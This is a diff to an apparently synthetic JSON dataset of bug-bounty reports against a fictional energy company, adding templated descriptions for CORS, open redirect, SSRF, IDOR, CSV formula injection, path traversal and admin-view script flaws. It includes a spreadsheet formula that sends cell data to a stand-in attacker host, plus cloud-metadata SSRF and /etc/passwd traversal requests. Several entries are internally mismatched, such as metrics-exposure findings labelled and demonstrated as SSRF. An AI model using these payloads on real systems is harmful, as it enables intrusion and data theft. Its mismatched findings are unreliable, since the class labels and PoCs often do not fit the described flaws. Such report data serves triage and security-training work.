@@ -5655,7 +5698,8 @@
           "offset": "2d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5810,7 +5854,8 @@
           "offset": "3d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5938,7 +5983,8 @@
           "offset": "4d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6058,7 +6104,8 @@
           "offset": "6d 10h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6210,7 +6257,8 @@
           "offset": "8d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6353,7 +6401,8 @@
           "offset": "3d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://billing.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6476,7 +6525,8 @@
           "offset": "8d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://billing.rheinspitze-energie.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6632,7 +6682,8 @@
           "offset": "4d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6776,7 +6827,8 @@
           "offset": "7d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6920,7 +6972,8 @@
           "offset": "8d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7012,7 +7065,8 @@
           "offset": "1d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://billing.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7139,7 +7193,8 @@
           "offset": "2d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7327,7 +7382,8 @@
           "offset": "7d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7451,7 +7507,8 @@
           "offset": "2d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7551,7 +7608,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7660,7 +7718,8 @@
           "offset": "3d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7770,7 +7829,8 @@
           "offset": "3d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://billing.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7921,7 +7981,8 @@
           "offset": "6d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8049,7 +8110,8 @@
           "offset": "9d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8180,7 +8242,8 @@
           "offset": "2d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8311,7 +8374,8 @@
           "offset": "6d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8435,7 +8499,8 @@
           "offset": "3d 4h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8603,7 +8668,8 @@
           "offset": "5d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://billing.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8706,7 +8772,8 @@
           "offset": "3d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://billing.rheinspitze-energie.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8818,7 +8885,8 @@
           "offset": "1d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8945,7 +9013,8 @@
           "offset": "2d 5h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.rheinspitze-energie.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9093,7 +9162,8 @@
           "offset": "4d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rheinspitze-energie.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9273,7 +9343,8 @@
           "offset": "7d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9409,7 +9480,8 @@
           "offset": "8d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.rheinspitze-energie.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9599,7 +9671,8 @@
           "offset": "8d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://kundenportal.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9722,7 +9795,8 @@
           "offset": "5d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9821,7 +9895,8 @@
           "offset": "18h",
